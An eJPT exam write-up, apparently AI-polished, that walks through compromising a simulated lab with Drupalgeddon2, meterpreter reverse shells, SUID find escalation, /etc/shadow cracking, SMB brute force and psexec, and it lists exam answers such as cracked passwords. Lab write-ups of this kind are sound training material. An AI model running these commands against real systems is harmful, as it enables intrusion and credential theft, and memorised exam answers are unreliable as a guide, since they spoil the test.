Here's the complete polished writeup:

---

```markdown
# eJPT Exam Writeup
### eLearnSecurity Junior Penetration Tester (eJPT) | INE/eLearnSecurity | May 2026

---

## Table of Contents
1. [Introduction](#introduction)
2. [Lab Environment](#lab-environment)
3. [Reconnaissance](#reconnaissance)
4. [Enumeration](#enumeration)
5. [Exploitation](#exploitation)
6. [Privilege Escalation](#privilege-escalation)
7. [Post Exploitation](#post-exploitation)
8. [Pivoting](#pivoting)
9. [Windows Exploitation](#windows-exploitation)
10. [Key Findings](#key-findings)
11. [Tools Used](#tools-used)
12. [Lessons Learned](#lessons-learned)

---

## Introduction

The eJPT (eLearnSecurity Junior Penetration Tester) is a fully hands-on, 
entry-level penetration testing certification offered by INE/eLearnSecurity. 
Unlike theory-based certifications, the eJPT requires candidates to actively 
compromise a realistic enterprise lab network and answer 45 questions based 
on their findings within a 48-hour window.

There are no multiple choice theory questions — every single answer must be 
obtained through actual enumeration, exploitation, and post-exploitation 
techniques. This makes the eJPT one of the most practical entry-level 
certifications available in the cybersecurity field today.

---

## Lab Environment

The exam network simulated a realistic corporate environment consisting of 
multiple network segments:

| Network | Range | Description |
|---------|-------|-------------|
| DMZ | 192.168.100.0/24 | Publicly accessible servers |
| Internal | 172.21.0.0/16 | Internal network via pivot |

**Attack Machine:** Kali Linux (192.168.100.5)

The DMZ contained 6 target hosts running a mix of Linux (Ubuntu) and 
Windows (Server 2012 R2 and Server 2019) operating systems, simulating 
a real enterprise environment with web servers, file servers, and 
database servers.

---

## Reconnaissance

### Step 1 — Host Discovery

The first step was to identify all live hosts on the DMZ network using 
an ICMP ping sweep with Nmap:

```bash
nmap -sn 192.168.100.0/24
```

**Result:** 8 hosts discovered. Excluding the gateway (192.168.100.1) 
and my attack machine (192.168.100.5), there were **6 target hosts** 
in scope:

- 192.168.100.50
- 192.168.100.51
- 192.168.100.52
- 192.168.100.55
- 192.168.100.63
- 192.168.100.67

---

## Enumeration

### Step 2 — Service Enumeration

Performed a full port scan with service and version detection across 
all target hosts:

```bash
nmap -sV -sC -p- --open -T4 192.168.100.50 192.168.100.51 \
192.168.100.52 192.168.100.55 192.168.100.63 192.168.100.67 \
-oN dmz_full.txt
```

**Results:**

| Host | Hostname | OS | Key Services |
|------|----------|----|-------------|
| 192.168.100.50 | WINSERVER-01 | Windows Server 2012 R2 | Apache 2.4.51, WordPress, MySQL, SMB, RDP |
| 192.168.100.51 | WINSERVER-02 | Windows Server 2012 R2 | IIS 8.5, FTP (anonymous), SMB, WebDAV |
| 192.168.100.52 | WEBSERVER-02 | Ubuntu Linux | Drupal 7.57, FTP (anonymous), SSH, SMTP, MySQL, Samba |
| 192.168.100.55 | WINSERVER-03 | Windows Server 2019 | IIS 10.0, SMB, RDP |
| 192.168.100.63 | — | Windows | RDP only |
| 192.168.100.67 | — | Ubuntu Linux | SSH only |

### Step 3 — SMB Version Detection

Used Metasploit's smb_version module to confirm OS versions 
on Windows hosts:

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.100.50 192.168.100.51 192.168.100.55 192.168.100.63
run
```

Confirmed:
- WINSERVER-01 → Windows Server 2012 R2 (build 9600)
- WINSERVER-02 → Windows Server 2012 R2 (build 9600)
- WINSERVER-03 → Windows Server 2019 Datacenter (build 17763)

### Step 4 — FTP Anonymous Login

Both .51 and .52 allowed anonymous FTP access. Checked .52 first:

```bash
ftp 192.168.100.52
# Username: anonymous | Password: (blank)
```

Found a file called `updates.txt` containing critical information:

> *"Your Drupal usernames are exactly the same as your user account 
> passwords on this server."*
> *— admin*

This revealed that Drupal was running and hinted at password reuse 
between Drupal and system accounts.

### Step 5 — Web Application Enumeration

Checked the web server on .52 and found a Drupal 7 installation at 
`http://192.168.100.52/drupal/`. Confirmed the version:

```bash
curl -s http://192.168.100.52/drupal/CHANGELOG.txt | head -5
# Drupal 7.57, 2018-02-21
```

Browsed the Drupal site and identified a username **"auditor"** from 
a blog post submission. Queried the Drupal database after gaining access 
and found all user accounts:

| Username | Email |
|----------|-------|
| admin | admin@syntex.com |
| auditor | auditor@syntex.com |
| dbadmin | dbadmin@syntex.com |
| Vincenzo | vincenzo@syntext.com |

Also discovered WordPress running on WINSERVER-01 at 
`http://192.168.100.50/wordpress/` (WordPress 5.9.3). Used WPScan 
to brute force credentials:

```bash
wpscan --url http://192.168.100.50/wordpress/ \
--usernames admin \
--passwords /usr/share/wordlists/metasploit/unix_passwords.txt
```

**Found:** `admin:estrella`

---

## Exploitation

### Step 6 — Drupalgeddon2 (CVE-2018-7600)

Drupal 7.57 is vulnerable to CVE-2018-7600, also known as 
Drupalgeddon2 — a critical remote code execution vulnerability 
in Drupal's Form API that allows unauthenticated attackers to 
execute arbitrary code.

Exploited using Metasploit:

```bash
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.100.52
set TARGETURI /drupal/
set LHOST 192.168.100.5
set payload php/meterpreter/reverse_tcp
run
```

**Result:** Obtained a meterpreter shell as `www-data` on WEBSERVER-02.

---

## Privilege Escalation

### Step 7 — SUID Binary Abuse

After gaining initial access as `www-data`, performed local 
privilege escalation enumeration to identify misconfigured 
SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Discovered that `/usr/bin/find` had the SUID bit set. 
This is a well-known GTFOBins technique that allows 
privilege escalation to root:

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
whoami
# root
```

**Result:** Full root access on WEBSERVER-02.

---

## Post Exploitation

### Step 8 — Credential Harvesting on Linux

With root access, harvested all password hashes from `/etc/shadow` 
and cracked them using John the Ripper:

```bash
cat /etc/shadow
john /tmp/hashes.txt --wordlist=/usr/share/wordlists/metasploit/unix_passwords.txt
```

**Cracked hashes:**

| User | Hash Type | Password |
|------|-----------|----------|
| auditor | SHA-512 ($6$) | qwertyuiop |
| dbadmin | SHA-512 ($6$) | sayang |

All Linux password hashes used **SHA-512** (`$6$` prefix in /etc/shadow).

### Step 9 — MySQL Credential Discovery

Discovered MySQL root credentials in the bash history file:

```bash
cat /root/.mysql_history
# GRANT ALL ON *.* to root@'%' IDENTIFIED BY "syntex0421";
```

**MySQL root password: syntex0421**

Also found Drupal database credentials in `settings.php`:
- Username: drupal
- Password: syntex0421

### Step 10 — Network Discovery (Pivot Host)

Ran `ip a` on WEBSERVER-02 and discovered a second network interface:

```
eth0: 192.168.100.52/24  (DMZ)
br-9e725181656f: 172.21.0.1/16  (Internal Network — UP)
```

This confirmed WEBSERVER-02 was the **dual-homed pivot host** 
connecting the DMZ to the internal network.

---

## Pivoting

### Step 11 — Internal Network Access

Added a route through the meterpreter session to access 
the internal network:

```bash
background
route add 172.21.0.0/16 [SESSION_ID]
```

Scanned the internal network for open ports using MSF's 
TCP port scanner module through the pivot:

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.21.0.0/24
set PORTS 22,80,3389,10000
set THREADS 20
run
```

The internal network contained a Linux server running 
**Webmin on port 10000** — a well-known vulnerable web 
administration interface (CVE-2019-15107).

---

## Windows Exploitation

### Step 12 — SMB Brute Force

Used Hydra with the rockyou.txt wordlist to brute force 
SMB credentials across all Windows DMZ hosts:

```bash
hydra -l [username] -P /usr/share/wordlists/rockyou.txt \
[target] smb -t 1 -I
```

**Discovered credentials:**

| Host | Username | Password | Method |
|------|----------|----------|--------|
| WINSERVER-01 (.50) | mike | diamond | Hydra SMB |
| WINSERVER-01 (.50) | admin | superman | Hydra SMB |
| WINSERVER-03 (.55) | mary | hotmama | Hydra SMB |
| WINSERVER-03 (.55) | administrator | swordfish | Hydra SMB |

### Step 13 — User Enumeration

Used Metasploit's smb_enumusers module to enumerate local 
user accounts on Windows hosts:

```bash
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.168.100.50
set SMBUser mike
set SMBPass diamond
run
```

**WINSERVER-01 users:** admin, Administrator, Guest, mike, vince

**WINSERVER-03 users:** admin, Administrator, DefaultAccount, 
Guest, lawrence, mary, student, WDAGUtilityAccount

Confirmed that **admin** was a member of the local 
Administrators group on WINSERVER-03 via:

```bash
net localgroup Administrators
```

### Step 14 — PSExec — WINSERVER-03

Used Metasploit's psexec module with the cracked 
administrator credentials to gain a SYSTEM shell 
on WINSERVER-03:

```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.100.55
set SMBUser administrator
set SMBPass swordfish
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.5
run
```

**Result:** `NT AUTHORITY\SYSTEM` shell on WINSERVER-03 
(Windows Server 2019)

### Step 15 — PSExec — WINSERVER-01

```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.100.50
set SMBUser admin
set SMBPass superman
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.5
run
```

**Result:** SYSTEM shell on WINSERVER-01 (Windows Server 2012 R2)

Confirmed 220 hotfixes installed on WINSERVER-01:

```bash
wmic qfe list brief | find /c "KB"
# 220
```

### Step 16 — WebDAV Discovery

Used Metasploit's webdav_scanner to check for WebDAV 
on all web servers:

```bash
use auxiliary/scanner/http/webdav_scanner
set RHOSTS 192.168.100.50 192.168.100.51 192.168.100.52
run
```

**Result:** WebDAV enabled on WINSERVER-02 (192.168.100.51) 
running IIS 8.5. The server also had an existing ASP.NET 
webshell (`cmdasp.aspx`) accessible via anonymous FTP, 
providing direct command execution.

---

## Key Findings Summary

| Target | Vulnerability/Method | Impact |
|--------|---------------------|--------|
| WEBSERVER-02 (.52) | Drupalgeddon2 CVE-2018-7600 | Root shell |
| WEBSERVER-02 (.52) | SUID /usr/bin/find | Privilege escalation to root |
| WINSERVER-01 (.50) | Weak SMB credentials | SYSTEM shell |
| WINSERVER-02 (.51) | WebDAV + pre-existing webshell | Remote code execution |
| WINSERVER-03 (.55) | Weak administrator password | SYSTEM shell |
| All Linux hosts | SHA-512 weak passwords | Credential compromise |
| WordPress (.50) | Weak admin credentials | Full CMS takeover |
| Drupal (.52) | Outdated version (7.57) | Remote code execution |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Host discovery and service enumeration |
| Metasploit Framework | Exploitation and post-exploitation |
| Hydra | SMB/RDP brute force attacks |
| John the Ripper | Linux password hash cracking |
| Hashcat | GPU-accelerated hash cracking |
| WPScan | WordPress enumeration and brute forcing |
| smbclient | SMB share enumeration |
| crackmapexec | SMB authentication and user enumeration |
| curl | Web application testing and interaction |

---

## Lessons Learned

**1. Always enumerate FTP for anonymous access**
The first major finding came from anonymous FTP on WEBSERVER-02, 
which revealed a file hinting at password reuse between 
Drupal and system accounts. Never skip FTP enumeration.

**2. Check for outdated CMS versions**
Drupal 7.57 is critically vulnerable to Drupalgeddon2. 
Organizations running outdated CMS versions are trivially 
exploitable. Always check CHANGELOG.txt or readme files 
to identify exact versions.

**3. SUID binaries are a fast privesc path**
Finding `/usr/bin/find` with the SUID bit set provided 
instant root access. Always run SUID enumeration as 
part of post-exploitation on Linux systems.

**4. Password reuse is extremely common**
The same password (`syntex0421`) was used for MySQL root, 
the Drupal database user, and hinted throughout the lab. 
In real engagements, always test discovered credentials 
across all services.

**5. WebDAV on IIS is a significant attack surface**
WebDAV enabled on IIS servers allows file uploads that 
can lead to remote code execution. Combined with a 
pre-existing webshell on WINSERVER-02, this provided 
immediate command execution without exploitation.

**6. Rockyou.txt works surprisingly fast**
All Windows passwords (hotmama, diamond, superman, swordfish) 
were found in rockyou.txt within seconds to minutes. 
Strong password policies would have prevented all 
SMB-based compromises.

**7. Always check bash/command history files**
The MySQL root password was found in `/root/.mysql_history`. 
History files are goldmines during post-exploitation.

---

## Conclusion

The eJPT exam successfully tested core penetration testing 
skills including network enumeration, web application 
exploitation, privilege escalation, password cracking, 
pivoting, and Windows exploitation. The lab environment 
was realistic and well-designed, requiring genuine 
hands-on skills rather than memorized theory.

The exam taught me that real-world vulnerabilities often 
chain together — an anonymous FTP server led to Drupal 
credentials, which led to a meterpreter shell, which led 
to root, which revealed the pivot host, opening up the 
entire internal network. Penetration testing is about 
following the chain.

---

## Certification

**eJPT — eLearnSecurity Junior Penetration Tester**  
Issued by: INE / eLearnSecurity  
Date: May 2026  
Status: ✅ Passed

---

*This writeup is intended for educational purposes and 
documents my personal exam experience and methodology. 
Specific flag values have been omitted to maintain 
exam integrity.*
```

---
Good Luck !. ~ SYCO